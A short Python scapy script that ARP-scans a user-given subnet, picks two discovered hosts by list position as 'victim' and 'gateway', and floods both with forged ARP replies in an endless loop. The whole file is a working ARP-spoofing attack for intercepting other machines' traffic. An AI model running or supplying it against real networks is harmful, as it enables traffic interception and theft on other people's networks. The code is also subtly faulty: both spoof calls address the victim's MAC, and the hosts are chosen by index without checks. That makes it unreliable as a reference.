from scapy.all import *
import scapy.all as scapy
from scapy.all import Ether
from scapy.all import IP
from scapy.all import ARP
from scapy.all import DNS
from scapy.all import packet

print("Choose in which network you want to scan")
print("Network example : 192.168.1.0/24")
a=input()

frame = Ether(dst="ff:ff:ff:ff:ff:ff")

arp_packet = frame/ARP(pdst=a)


IP_MAC_responses, unans = srp(arp_packet, timeout=2)

MAC_on_network = []
IP_on_network = []

for i in range(len(IP_MAC_responses)):
    MAC_on_network.append(IP_MAC_responses[i][1].hwsrc)
    IP_on_network.append(IP_MAC_responses[i][1].psrc)

print(MAC_on_network, IP_on_network)

MAC_victim=MAC_on_network[1]
IP_victim=IP_on_network[1]
MAC_gateway=MAC_on_network[2]
IP_gateway=IP_on_network[2]

print("MAC victim = ",MAC_victim,", IP victim = ",IP_victim,", MAC gateway = ",MAC_gateway,", IP gateway = ",IP_gateway)
def arp_spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = MAC_victim, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

while True:
        arp_spoof(IP_victim, IP_gateway)
        arp_spoof(IP_gateway, IP_victim)